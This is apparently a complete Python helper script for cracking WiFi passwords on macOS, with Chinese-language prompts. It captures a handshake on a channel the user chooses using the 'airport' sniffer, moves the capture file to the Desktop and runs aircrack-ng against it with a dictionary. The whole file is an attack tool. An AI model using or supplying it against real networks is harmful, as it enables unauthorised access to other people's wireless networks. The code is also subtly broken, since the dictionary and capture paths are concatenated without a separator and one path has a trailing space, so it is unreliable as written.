#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

import os
import re

#mac版本
mac_mb_1 = "sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport"
mac_mb_2 = "airport -s"
mac_mb_3 = "sudo airport en0 sniff "
mac_mb_4 = "aircrack-ng -w "

mac_mb_5 = ""
mac_mb_6 = ""
mac_mb_7 = ""

gzlj = os.getcwd()

def move_wsb():
	move_lj = os.path.join(gzlj, "Desktop", "A.cap")
	lj_hq = "/tmp"
	for lj_zc, zml_zc, zwj_zc in os.walk(lj_hq):
		for name in zwj_zc:
			jg = re.match(r'^airport(\w{11}).cap', name, re.I)
			if jg:
				move_lj_mb = os.path.join(lj_hq, name)
				zc_ml = "mv " + move_lj_mb + " " + move_lj
				os.system(zc_ml)



def mac_1():
	print("WiFi抓包辅助脚本启动！")
	os.system(mac_mb_1)
	print("正在读取WiFi列表")
	os.system(mac_mb_2)
	mac_mb_xd = input("目标信道：")
	print("开始等待洪流攻击")
	input("按下回车开始监听！")
	print("正在开始监听")
	print("按下 ctrl + c 结束")
	mac_mb_5 = mac_mb_3 + mac_mb_xd
	os.system(mac_mb_5)
	print("正在移动抓包文件")
	move_wsb()
	print("是否开始破解握手包？")
	aaa = input("[y/n]:")
	if aaa == "y":
		mac_2()


def mac_2():
	print("WiFi握手包破解辅助脚本启动！")
	print("字典请自行放入桌面 命名为‘pass.txt’")
	print("确认后按下回车开始破解！")
	zd_name = os.path.join(gzlj, "Desktop", "pass.txt ")
	hand_name = os.path.join(gzlj, "Desktop", "A.cap")
	mac_mb_7 = mac_mb_4 + zd_name + hand_name
	os.system(mac_mb_7)


print("WiFi破解辅助脚本启动！")

def main():
	core = input("core:")

	if core == "start":
		mac_1()
	
	if core == "c":
		mac_2()

	main()

main()

#os.system(hi)